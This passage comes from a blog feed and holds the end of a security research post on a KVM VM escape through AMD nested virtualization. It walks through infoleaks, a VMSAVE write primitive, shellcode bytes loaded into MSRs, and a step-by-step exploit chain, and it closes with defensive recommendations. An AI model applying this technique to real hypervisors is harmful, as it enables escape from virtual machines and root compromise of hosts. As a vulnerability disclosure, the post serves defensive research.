class="c1"&gt;&amp;amp;&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;~(&lt;/span&gt;&lt;span class="c10"&gt;0xFFF&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c11"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; wrmsr&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;MSR_IBS_OP_CTL&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;ibs&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c11"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; wrmsr&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;MSR_IBS_OP_CTL&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;ibs &lt;/span&gt;&lt;span class="c1"&gt;&amp;amp;&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;~&lt;/span&gt;&lt;span class="c3"&gt;IBS_OP_EN&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c5 c9"&gt;&lt;span class="c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c13"&gt;&lt;span class="c8"&gt;Using this infoleak primitive, I started to create a fake host save area by preparing my own page tables (for pointing CR3 at them), interrupt descriptor tables and segment descriptors and pointing RIP to a primitive shellcode that would write to the serial console. Of course, my first tries immediately crashed the whole system and even after spending multiple days to make sure everything was set up correctly, the system would crash immediately once I pointed the hsave MSR at my own location. &lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c9"&gt;&lt;span class="c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c13"&gt;&lt;span class="c8"&gt;After getting frustrated with the total lack of progress, watching my server reboot for the hundredth time, trying to come up with a different exploitation strategy for two weeks and learning about the surprising regularity of physical page migrations on Linux, I realized that I made an important mistake. Just because the CPU initializes all the expected fields in the host save area, it is not safe to assume that these fields are actually used for restoring the host context. Slow trial and error led to the discovery that my AMD EPYC CPU ignores everything in the host save area besides the values of the RIP, RSP and RAX registers.&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c9"&gt;&lt;span class="c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c13"&gt;&lt;span class="c8"&gt;While this register control would make a local privilege escalation straightforward, escaping the VM boundary is a bit more complicated. RIP and RSP control make launching a kernel ROP chain the next logical step, but this requires us to first break the host kernel&amp;#39;s address randomization and to find a way to store controlled data at a known host virtual address (HVA). &lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c9"&gt;&lt;span class="c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c13"&gt;&lt;span class="c8"&gt;Fortunately, we have IBS as a powerful infoleak building primitive and can use it to gather all required information in a single run: &lt;/span&gt;&lt;/p&gt;&lt;ul style="padding: 0;" class="c12 lst-kix_p3qtgxnpnwqf-0 start"&gt;&lt;li style="margin-left: 46pt;" class="c4 li-bullet-0"&gt;&lt;span class="c8"&gt;Leaking the host kernel&amp;#39;s (or more specifically kvm-amd.ko&amp;rsquo;s) base address can be done by enabling IBS sampling with a small sampling interval and immediately triggering a VM exit. When VM execution continues, the IBS result MSRs will contain the HVA of instructions executed by KVM during the exit handling. &lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c4 li-bullet-0"&gt;&lt;span&gt;The most powerful way to store data at a known HVA is to leak the location of the kernel&amp;rsquo;s linear mapping (also known as &lt;/span&gt;&lt;span&gt;physmap&lt;/span&gt;&lt;span class="c8"&gt;), a 1:1 mapping of all physical pages on the system. This gives us a GPA-&amp;gt;HVA translation primitive by first using our GPA-&amp;gt;HPA infoleak from above and then adding the HPA to the physmap base address. Leaking the physmap is possible by sampling micro ops in the host kernel until we find a read or write operation, where the lower ~30 bits of the accessed virtual address and physical address are identical. &lt;/span&gt;&lt;/li&gt;&lt;/ul&gt; &lt;p class="c5 c9"&gt;&lt;span class="c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c13"&gt;&lt;span class="c8"&gt;Having all these building blocks in place, we could now try to build a kernel ROP chain that executes some interesting payload. However, there is one important caveat. When we take over execution after a vmexit, the system is still in a somewhat unstable state. As mentioned above, SVM&amp;rsquo;s context switching is very minimal and we are at least one VMLOAD instruction and reenabling of interrupts away from a usable system. While it is surely possible to exploit this bug and to restore the original host context using a sufficiently complex ROP chain, I decided to find a way to run my own code instead.&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c9"&gt;&lt;span class="c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c13"&gt;&lt;span class="c8"&gt;A couple of years ago, the Linux physmap was still mapped executable and executing our own code would be as simple as jumping to a physmap mapping of one of our guest pages. Of course, that is not possible anymore and the kernel tries hard to not have any memory pages mapped as writable and executable. Still, page protections only apply to virtual memory accesses so why not use an instruction that directly writes controlled data to a physical address? As you might remember from our initial discussion of SVM earlier in this chapter, SVM supports an instruction called VMSAVE to store hidden guest state (or host state) in a VMCB. Similar to VMRUN, VMSAVE takes a physical address to a VMCB stored in the RAX register as an implicit argument. It then writes the following register state to the VMCB:&lt;/span&gt;&lt;/p&gt;&lt;ul style="padding: 0;" class="c12 lst-kix_dvq5vbolwb6x-0 start"&gt;&lt;li style="margin-left: 46pt;" class="c4 li-bullet-0"&gt;&lt;span class="c8"&gt;FS, GS, TR, LDTR &lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c4 li-bullet-0"&gt;&lt;span class="c8"&gt;KernelGsBase &lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c4 li-bullet-0"&gt;&lt;span class="c8"&gt;STAR, LSTAR, CSTAR, SFMASK &lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c4 li-bullet-0"&gt;&lt;span class="c8"&gt;SYSENTER_CS, SYSENTER_ESP, SYSENTER_EIP&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt; &lt;p class="c5 c9"&gt;&lt;span class="c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c13"&gt;&lt;span class="c8"&gt;For us, VMSAVE is interesting for a couple of reasons:&lt;/span&gt;&lt;/p&gt;&lt;ul style="padding: 0;" class="c12 lst-kix_z3dz91t3nune-0 start"&gt;&lt;li style="margin-left: 46pt;" class="c4 li-bullet-0"&gt;&lt;span class="c8"&gt;It is used as part of KVM&amp;rsquo;s normal SVM exit handler and can be easily integrated into a minimal ROP chain.&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c4 li-bullet-0"&gt;&lt;span class="c8"&gt;It operates on physical addresses, so we can use it to write to an arbitrary memory location including KVM&amp;rsquo;s own code.&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c4 li-bullet-0"&gt;&lt;span class="c8"&gt;All written registers still contain the guest values set by our VM, allowing us to control the written content with some restrictions&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt; &lt;p class="c5 c9"&gt;&lt;span class="c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c13"&gt;&lt;span class="c8"&gt;VMSAVE&amp;rsquo;s biggest downside as an exploitation primitive is that RAX needs to be page aligned, reducing our control of the target address. VMSAVE writes to the memory offsets 0x440-0x480 and 0x600-0x638 so we need to be careful about not corrupting any memory that&amp;rsquo;s in use. &lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c13"&gt;&lt;span class="c8"&gt;In our case this turns out to be a non-issue, as KVM contains a couple of code pages where functions that are rarely or never used (e.g cleanup_module or SEV specific code) are stored at these offsets. &lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c9"&gt;&lt;span class="c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c13"&gt;&lt;span&gt;While we don&amp;rsquo;t have full control over the written data and valid register values are somewhat restricted, it is still possible to write a minimal stage0 shellcode to an arbitrary page in the host kernel by filling guest MSRs with the right values. My exploit uses the STAR, LSTAR and CSTAR registers for this which are written to the physical offsets 0x400, 0x408 and 0x410. As all three registers need to contain&lt;/span&gt;&lt;span class="c16"&gt;&lt;a class="c71" href="https://en.wikipedia.org/w/index.php?title=X86-64#Virtual_address_space_details"&gt;&amp;nbsp;canonical addresses&lt;/a&gt;&lt;/span&gt;&lt;span class="c8"&gt;, we can only use parts of the registers for our shellcode and use relative jumps to skip the unusable parts of the STAR and LSTAR MSRs:&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c9"&gt;&lt;span class="c8"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.42d44951583ac9bd6dae4dc111d7e4042c6fe14e"&gt;&lt;/a&gt;&lt;a id="t.9"&gt;&lt;/a&gt;&lt;table class="c30"&gt;&lt;tbody&gt;&lt;tr class="c28"&gt;&lt;td class="c17" colspan="1" rowspan="1"&gt; &lt;p class="c5"&gt;&lt;span class="c22"&gt;&amp;nbsp; // mov cr0, rbx; &lt;/span&gt;&lt;span class="c22"&gt;jmp&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; wrmsr&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;MSR_STAR&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c10"&gt;0x00000003ebc3220f&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c22"&gt;// pop rdi; pop rsi; pop rcx; jmp&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; wrmsr&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;MSR_LSTAR&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c10"&gt;0x00000003&lt;/span&gt;&lt;span class="c10"&gt;eb595e5fULL&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c22"&gt;// rep movsb; pop rdi; jmp rdi;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5"&gt;&lt;span class="c3"&gt;&amp;nbsp; wrmsr&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;MSR_CSTAR&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c10"&gt;0xe7ff5fa4f3&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c5 c9"&gt;&lt;span class="c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c13"&gt;&lt;span class="c8"&gt;The above code makes use of the fact that we control the value of the RBX register and the stack when we return to it as part of our initial ROP chain. First, we copy the value of RBX (0x80040033) into CR0, which disables Write Protection (WP) for kernel memory accesses. This makes all of the kernel code writable on this CPU allowing us to copy a larger stage1 shellcode to an arbitrary unused memory location and jump to it.&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c9"&gt;&lt;span class="c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c13"&gt;&lt;span class="c8"&gt;Once the WP bit in cr0 is disabled and the stage1 payload executes, we have a wide range of options. For my proof-of-concept exploit I decided on a somewhat boring but easy-to-implement approach to spawn a random user space command: The host is still in a very weird state so our stage1 payload can&amp;rsquo;t directly call into other kernel functions, but we can easily backdoor a function pointer which will be called at some later point in time. KVM uses the kernel&amp;rsquo;s global workqueue feature to regularly synchronize a VM&amp;rsquo;s clock between different vCPUs. The function pointer responsible for this work is stored in the (per VM) kvm-&amp;gt;arch data structure as kvm-&amp;gt;arch.kvmclock_update_work. The stage1 payload overrides this function pointer with the address of a stage2 payload. To put the host into a usable state it then sets the VM_HSAVE_PA MSR back to its original value and restores RSP and RIP to call the original vmexit handler. &lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c9"&gt;&lt;span class="c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c9"&gt;&lt;span class="c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c13"&gt;&lt;span class="c8"&gt;The final stage2 payload executes at some later point in time as part of the kernel global work queue and uses the call_usermodehelper to run an arbitrary command with root privileges. &lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c9"&gt;&lt;span class="c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c13"&gt;&lt;span class="c8"&gt;Let&amp;rsquo;s put all of this together and walk through the attacks step-by-step:&lt;/span&gt;&lt;/p&gt;&lt;ol class="c12 lst-kix_69oxjbhu0l4-0 start" start="1"&gt;&lt;li style="margin-left: 46pt;" class="c4 li-bullet-0"&gt;&lt;span class="c8"&gt;Prepare the stage0 payload by splitting it up and setting the right guest MSRs.&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c4 li-bullet-0"&gt;&lt;span class="c8"&gt;Trigger the TOCTOU vulnerability in nested_svm_vmrun and free the MSR permission bitmap by disabling the SVME bit in the EFER MSR.&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c4 li-bullet-0"&gt;&lt;span class="c8"&gt;Wait for the pages to be reused and initialized to 0 to get unrestricted MSR access.&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c4 li-bullet-0"&gt;&lt;span class="c8"&gt;Prepare a fake host save area, a stack for the initial ROP chain and a staging memory area for the stage1 and stage2 payloads. &lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c4 li-bullet-0"&gt;&lt;span class="c8"&gt;Leak the HPA of the host save area, the HVA addresses of the stack and staging page and the kvm-amd.ko&amp;rsquo;s base address using the different IBS infoleaks.&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c4 li-bullet-0"&gt;&lt;span class="c8"&gt;Redirect execution to the VMSAVE gadget by setting RIP, RSP and RAX in the fake host save area, pointing the VM_HSAVE_PA MSR at it and triggering a VM exit.&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c4 li-bullet-0"&gt;&lt;span class="c8"&gt;VMSAVE writes the stage0 payload to an unused offset in kvm-amd&amp;rsquo;s code segment, when the gadget returns stage0 gets executed.&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c4 li-bullet-0"&gt;&lt;span class="c8"&gt;stage0 disables Write Protection in CR0 and overwrites an unused executable memory location with the stage1 and stage2 payloads, before jumping to stage1.&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c4 li-bullet-0"&gt;&lt;span class="c8"&gt;stage1 overwrites kvm-&amp;gt;arch.kvmclock_update_work.work.func with a pointer to stage2 before restoring the original host context.&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c4 li-bullet-0"&gt;&lt;span class="c8"&gt;At some later point in time kvm-&amp;gt;arch.kvmclock_update_work.work.func is called as part of the global kernel work_queue and stage2 spawns an arbitrary command using call_usermodehelper. &lt;/span&gt;&lt;/li&gt;&lt;/ol&gt; &lt;p class="c5 c9"&gt;&lt;span class="c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c13"&gt;&lt;span&gt;Interested readers should take a look at the heavily documented &lt;/span&gt;&lt;span class="c16"&gt;&lt;a class="c71" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2177#c5"&gt;proof-of-concept exploit&lt;/a&gt;&lt;/span&gt;&lt;span class="c8"&gt;&amp;nbsp;for the actual implementation. &lt;/span&gt;&lt;/p&gt;&lt;h2 class="c20 c13" id="h.jz5frebdego5"&gt;&lt;span class="c21"&gt;Conclusion&lt;/span&gt;&lt;/h2&gt; &lt;p class="c5 c13"&gt;&lt;span&gt;This blog post describes a KVM-only VM escape made possible by a small bug in KVM&amp;rsquo;s AMD-specific code for supporting nested virtualization. Luckily, the feature that made this bug exploitable was only included in two kernel versions (v5.10, v5.11) before the issue was spotted, reducing the real-life impact of the vulnerability to a minimum. &lt;/span&gt;&lt;span&gt;The bug and its exploit still serve as a demonstration that highly exploitable security vulnerabilities can still exist in the very core of a virtualization engine, which is almost certainly a small and well audited codebase&lt;/span&gt;&lt;span class="c8"&gt;. While the attack surface of a hypervisor such as KVM is relatively small from a pure LoC perspective, its low level nature, close interaction with hardware and pure complexity makes it very hard to avoid security-critical bugs. &lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c9"&gt;&lt;span class="c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c13"&gt;&lt;span&gt;While we have not seen any in-the-wild exploits targeting hypervisors outside of competitions like Pwn2Own, these capabilities are clearly achievable for a well-financed adversary. I&amp;rsquo;ve spent around two months on this research, working as an individual with only remote access to an AMD system. Looking at the potential ROI on an exploit like this, it seems safe to assume that more people are working on similar issues right now and that vulnerabilities in KVM, Hyper-V, Xen or VMware will be exploited in-the-wild sooner or later.&lt;/span&gt;&lt;span class="c8"&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c9"&gt;&lt;span class="c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c13"&gt;&lt;span class="c8"&gt;What can we do about this? Security engineers working on Virtualization Security should push for as much attack surface reduction as possible. Moving complex functionality to memory-safe user space components is a big win even if it does not help against bugs like the one described above. Disabling unneeded or unreviewed features and performing regular in-depth code reviews for new changes can further reduce the risk of bugs slipping by. &lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c9"&gt;&lt;span class="c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c13"&gt;&lt;span class="c8"&gt;Hosters, cloud providers and other enterprises that are relying on virtualization for multi-tenancy isolation should design their architecture in way that limits the impact of an attacker with an VM escape exploit:&lt;/span&gt;&lt;/p&gt;&lt;ul style="padding: 0;" class="c12 lst-kix_rg61eog4va0o-0 start"&gt;&lt;li style="margin-left: 46pt;" class="c4 li-bullet-0"&gt;&lt;span&gt;Isolation of VM hosts: Machines that host untrusted VMs should be considered at least partially untrusted. While a VM escape can give an attacker full control over a single host, it should not be easily possible to move from one compromised host to another. This requires that the control plane and backend infrastructure is sufficiently hardened and that user resources like disk images or encryption keys are only exposed to hosts that need them. One&lt;/span&gt;&lt;span&gt;&amp;nbsp;way to limit the impact of a VM escape even further is to only run VMs of a specific customer or of a certain sensitivity on a single machine.&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c4 li-bullet-0"&gt;&lt;span class="c8"&gt;Investing in detection capabilities: In most architectures, the behavior of a VM host should be very predictable, making a compromised host stick out quickly once an attacker tries to move to other systems. While it&amp;rsquo;s very hard to rule out the possibility of a vulnerability in your virtualization stack, good detection capabilities make life for an attacker much harder and increase the risk of quickly burning a high-value vulnerability. Agents running on the VM host can be a first (but bypassable) detection mechanism, but the focus should be on detecting unusual network communication and resource accesses.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt; &lt;p class="c5 c9 c35"&gt;&lt;span class="c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c9"&gt;&lt;span class="c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c9"&gt;&lt;span class="c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c9"&gt;&lt;span class="c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c9"&gt;&lt;span class="c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c9"&gt;&lt;span class="c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c9 c35"&gt;&lt;span class="c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c9"&gt;&lt;span class="c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c9"&gt;&lt;span class="c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c9"&gt;&lt;span class="c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c5 c9"&gt;&lt;span class="c8"&gt;&lt;/span&gt;&lt;/p&gt;</content>
    <link rel="replies" type="application/atom+xml" href="https://googleprojectzero.blogspot.com/feeds/8408446653514773445/comments/default" title="Post Comments" />
    <link rel="replies" type="text/html" href="https://googleprojectzero.blogspot.com/2021/06/an-epyc-escape-case-study-of-kvm.html#comment-form" title="0 Comments" />
    <link rel="edit" type="application/atom+xml" href="https://www.blogger.com/feeds/4838136820032157985/posts/default/8408446653514773445" />
    <link rel="self" type="application/atom+xml" href="https://www.blogger.com/feeds/4838136820032157985/posts/default/8408446653514773445" />
    <link rel="alternate" type="text/html" href="https://googleprojectzero.blogspot.com/2021/06/an-epyc-escape-case-study-of-kvm.html" title="An EPYC escape: Case-study of a KVM breakout" />
    <author>
      <name>Ryan</name>
      <uri>http://www.blogger.com/profile/17011901605865574886</uri>
      <email>noreply@blogger.com</email>
      <gd:image rel="http://schemas.google.com/g/2005#thumbnail" width="16" height="16" src="https://img1.blogblog.com/img/b16-rounded.gif" />
    </author>
    <thr:total>0</thr:total>
  </entry>
  <entry>
    <id>tag:blogger.com,1999:blog-4838136820032157985.post-2146117790598367776</id>
    <published>2021-05-20T10:07:00.000-07:00</published>
    <updated>2021-05-20T12:20:17.752-07:00</updated>
    <title type="text">Fuzzing iOS code on macOS at native speed</title>
    <content type="html">&lt;style type="text/css"&gt;@import url('https://themes.googleusercontent.com/fonts/css?kit=cGvuclDC_Z1vE_cnVEU6Ae_NZQ7StBcqH_vXVqoPMX0');.lst-kix_adz5e91jwu7t-8&gt;li:before{content:"" counter(lst-ctn-kix_adz5e91jwu7t-8,lower-roman) ". "}.lst-kix_aacxccbo6zlx-1&gt;li{counter-increment:lst-ctn-kix_aacxccbo6zlx-1}.lst-kix_adz5e91jwu7t-3&gt;li{counter-increment:lst-ctn-kix_adz5e91jwu7t-3}.lst-kix_adz5e91jwu7t-7&gt;li:before{content:"" counter(lst-ctn-kix_adz5e91jwu7t-7,lower-latin) ". "}ol.lst-kix_ii04ufl4nr9k-3.start{counter-reset:lst-ctn-kix_ii04ufl4nr9k-3 0}ol.lst-kix_aacxccbo6zlx-0.start{counter-reset:lst-ctn-kix_aacxccbo6zlx-0 0}.lst-kix_adz5e91jwu7t-5&gt;li:before{content:"" counter(lst-ctn-kix_adz5e91jwu7t-5,lower-roman) ". "}.lst-kix_adz5e91jwu7t-4&gt;li:before{content:"" counter(lst-ctn-kix_adz5e91jwu7t-4,lower-latin) ". "}.lst-kix_adz5e91jwu7t-6&gt;li:before{content:"" counter(lst-ctn-kix_adz5e91jwu7t-6,decimal) ". "}ol.lst-kix_kfxac5q5c62u-7.start{counter-reset:lst-ctn-kix_kfxac5q5c62u-7 0}.lst-kix_adz5e91jwu7t-1&gt;li:before{content:"" counter(lst-ctn-kix_adz5e91jwu7t-1,lower-latin) ". "}.lst-kix_adz5e91jwu7t-0&gt;li:before{content:"" counter(lst-ctn-kix_adz5e91jwu7t-0,decimal) ". "}.lst-kix_adz5e91jwu7t-2&gt;li:before{content:"" counter(lst-ctn-kix_adz5e91jwu7t-2,lower-roman) ". "}ol.lst-kix_ii04ufl4nr9k-0.start{counter-reset:lst-ctn-kix_ii04ufl4nr9k-0 0}.lst-kix_kfxac5q5c62u-1&gt;li{counter-increment:lst-ctn-kix_kfxac5q5c62u-1}.lst-kix_adz5e91jwu7t-3&gt;li:before{content:"" counter(lst-ctn-kix_adz5e91jwu7t-3,decimal) ". "}.lst-kix_hvcf6tgq957j-7&gt;li:before{content:"\0025cb  "}.lst-kix_hvcf6tgq957j-6&gt;li:before{content:"\0025cf  "}ol.lst-kix_adz5e91jwu7t-1.start{counter-reset:lst-ctn-kix_adz5e91jwu7t-1 0}.lst-kix_aacxccbo6zlx-0&gt;li{counter-increment:lst-ctn-kix_aacxccbo6zlx-0}ol.lst-kix_kfxac5q5c62u-4.start{counter-reset:lst-ctn-kix_kfxac5q5c62u-4 0}.lst-kix_hvcf6tgq957j-5&gt;li:before{content:"\0025a0  "}.lst-kix_hvcf6tgq957j-4&gt;li:before{content:"\0025cb  "}.lst-kix_hvcf6tgq957j-1&gt;li:before{content:"\0025cb  "}ol.lst-kix_adz5e91jwu7t-4.start{counter-reset:lst-ctn-kix_adz5e91jwu7t-4 0}ol.lst-kix_kfxac5q5c62u-8{list-style-type:none}.lst-kix_hvcf6tgq957j-3&gt;li:before{content:"\0025cf  "}ol.lst-kix_kfxac5q5c62u-7{list-style-type:none}.lst-kix_hvcf6tgq957j-2&gt;li:before{content:"\0025a0  "}.lst-kix_hvcf6tgq957j-0&gt;li:before{content:"\0025cf  "}ol.lst-kix_aacxccbo6zlx-3.start{counter-reset:lst-ctn-kix_aacxccbo6zlx-3 0}ol.lst-kix_adz5e91jwu7t-7.start{counter-reset:lst-ctn-kix_adz5e91jwu7t-7 0}.lst-kix_kfxac5q5c62u-2&gt;li{counter-increment:lst-ctn-kix_kfxac5q5c62u-2}ol.lst-kix_kfxac5q5c62u-4{list-style-type:none}ol.lst-kix_kfxac5q5c62u-3{list-style-type:none}ol.lst-kix_kfxac5q5c62u-6{list-style-type:none}ol.lst-kix_kfxac5q5c62u-5{list-style-type:none}ol.lst-kix_kfxac5q5c62u-0{list-style-type:none}ol.lst-kix_ii04ufl4nr9k-6.start{counter-reset:lst-ctn-kix_ii04ufl4nr9k-6 0}ol.lst-kix_kfxac5q5c62u-2{list-style-type:none}.lst-kix_ii04ufl4nr9k-8&gt;li{counter-increment:lst-ctn-kix_ii04ufl4nr9k-8}ol.lst-kix_kfxac5q5c62u-1{list-style-type:none}.lst-kix_aacxccbo6zlx-2&gt;li{counter-increment:lst-ctn-kix_aacxccbo6zlx-2}ul.lst-kix_ghczzllgiqkw-6{list-style-type:none}ul.lst-kix_ghczzllgiqkw-7{list-style-type:none}ul.lst-kix_ghczzllgiqkw-4{list-style-type:none}ul.lst-kix_ghczzllgiqkw-5{list-style-type:none}ol.lst-kix_aacxccbo6zlx-0{list-style-type:none}ul.lst-kix_ghczzllgiqkw-2{list-style-type:none}ol.lst-kix_aacxccbo6zlx-1{list-style-type:none}.lst-kix_adz5e91jwu7t-0&gt;li{counter-increment:lst-ctn-kix_adz5e91jwu7t-0}ul.lst-kix_ghczzllgiqkw-3{list-style-type:none}ol.lst-kix_aacxccbo6zlx-2{list-style-type:none}ul.lst-kix_ghczzllgiqkw-0{list-style-type:none}ol.lst-kix_aacxccbo6zlx-3{list-style-type:none}ul.lst-kix_ghczzllgiqkw-1{list-style-type:none}ol.lst-kix_aacxccbo6zlx-4{list-style-type:none}.lst-kix_aacxccbo6zlx-4&gt;li{counter-increment:lst-ctn-kix_aacxccbo6zlx-4}.lst-kix_ii04ufl4nr9k-1&gt;li{counter-increment:lst-ctn-kix_ii04ufl4nr9k-1}.lst-kix_kfxac5q5c62u-5&gt;li{counter-increment:lst-ctn-kix_kfxac5q5c62u-5}ol.lst-kix_adz5e91jwu7t-0.start{counter-reset:lst-ctn-kix_adz5e91jwu7t-0 